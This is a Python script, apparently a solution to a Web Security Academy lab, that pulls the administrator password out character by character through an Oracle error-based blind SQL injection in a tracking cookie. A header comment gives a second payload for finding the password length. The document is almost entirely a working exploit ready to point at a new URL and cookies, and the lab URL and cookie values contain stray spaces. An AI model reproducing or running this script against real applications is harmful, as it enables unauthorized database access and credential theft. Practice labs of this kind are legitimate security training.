""" 
1-don't forget to replce for your [url,cookies]

2- the length of the password: 
' || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator' AND ROWNUM = 1)) = {TRY-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL) || '
"""
import requests
import sys
import urllib.parse


url="https://0a6a00d 3803e0d1500cf0048.web-security-academy.net/"  

passwd=""
for l in range(1,21):
    for asc in range(32,127):

        payload=f"' || (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator' AND ROWNUM = 1), {l}, 1)) = {asc} THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL )||'"
        encode_pay=urllib.parse.quote(payload)
        cookie={
            "TrackingId":"eG59 qKUL4076"+ encode_pay,
            "session":"fVRE804fVKSsOym3S6H96o6FXf4"
        }

        resp=requests.get(url=url,cookies=cookie)
        if resp.status_code ==500:
            passwd+=chr(asc)
            sys.stdout.write(f"\rTrying: {passwd}")
            sys.stdout.flush()
            break
        else:

            sys.stdout.write(f"\rTrying: {passwd}{chr(asc)}")
            sys.stdout.flush()

print(f"\nFound passwd: {passwd}")
